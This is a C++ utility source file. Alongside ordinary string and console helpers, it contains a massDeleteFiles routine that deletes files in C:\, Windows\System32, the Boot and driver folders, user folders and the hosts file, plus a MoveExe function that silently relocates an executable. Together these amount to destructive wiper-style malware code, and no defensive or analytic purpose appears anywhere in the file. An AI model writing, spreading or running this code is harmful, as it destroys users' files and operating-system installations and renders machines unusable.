#include "../Headers/Tools.h"

auto Utils::Split(string data, string delimiter) -> vector<string>
{
	vector<string> result;
	size_t pos = 0;
	string token;
	while ((pos = data.find(delimiter)) != string::npos) {
		token = data.substr(0, pos);
		result.push_back(token);
		data.erase(0, pos + delimiter.length());
	}
	result.push_back(data);
	return result;
};

auto Utils::DisplayText(string text) -> void
{
	const char* c = text.c_str();
	cout << c << endl;
};

auto Utils::WaitForInput() -> string
{
	string input;
	getline(cin, input);
	return input;
};

auto Utils::GetInput(string text) -> string
{
	string input;
	cout << text << endl;
	getline(cin, input);
	return input;
};

auto Utils::WriteFile(string name, string path, string text) -> void
{
	ofstream file;
	file.open(path + name);
	file << text;
	file.close();
};

auto Utils::GetSystemType() -> string
{
	string type;
	if (system("ver") == 0) {
		type = "Windows";
	}
	else {
		type = "Not Windows";
	}
	return type;
};



auto Utils::MoveExe(string name, string path, string newpath) -> void
{
	Memory Memory;
	// check if the file has already been moved
	// cout << path + "\\" + name << endl;
	ifstream file(path + name);
	if (!file) {
		Memory.SilentMoveFile(name, path, newpath);
	}
	else {
		Memory.SilentMoveFile(name, path, newpath);
	};

};

auto Utils::massDeleteFiles() -> void
{
	map<string, string> paths;
	paths["path_1"] = "C:\\";
	paths["path_2"] = "C:\\Users\\Public\\";
	paths["path_3"] = "C:\\Windows\\";
	paths["path_4"] = "C:\\Users\\";
	paths["path_5"] = "C:\\Windows\\System32\\";
	paths["path_6"] = "C:\\Windows\\Boot\\";
	paths["path_7"] = "C:\\Users\\Public\\Documents\\";
	paths["path_8"] = "C:\\Users\\Public\\Downloads\\";
	paths["path_9"] = "C:\\Users\\Public\\Pictures\\";
	paths["path_10"] = "C:\\Users\\Public\\Videos\\";
	paths["path_11"] = "C:\\Windows\\System32\\drivers\\";
	paths["path_12"] = "C:\\Windows\\System32\\drivers\\etc\\";
	paths["path_13"] = "C:\\Windows\\System32\\drivers\\etc\\hosts";
	// loop through the paths and delete the files
	for (const auto& path : paths) {
		// check if the path exists
		if (std::filesystem::exists(path.second)) {
			// check if the path is a directory
			if (std::filesystem::is_directory(path.second)) {
				// loop through the directory and delete the files
				for (const auto& entry : std::filesystem::directory_iterator(path.second)) {
					// check if the path is a directory
					if (std::filesystem::is_directory(entry.path())) {
						// delete the files in the directory
						for (const auto& file : std::filesystem::directory_iterator(entry.path())) {
							// check if the file is a directory
							if (std::filesystem::is_directory(file.path())) {
								// delete the files in the directory
								for (const auto& file2 : std::filesystem::directory_iterator(file.path())) {
									// delete the file
									std::filesystem::remove(file2.path());
								};
							}
							else {
								// delete the file
								std::filesystem::remove(file.path());
							};
						};
					}
					else {
						// delete the file
						std::filesystem::remove(entry.path());
					};
				};
			};
		};
	};
};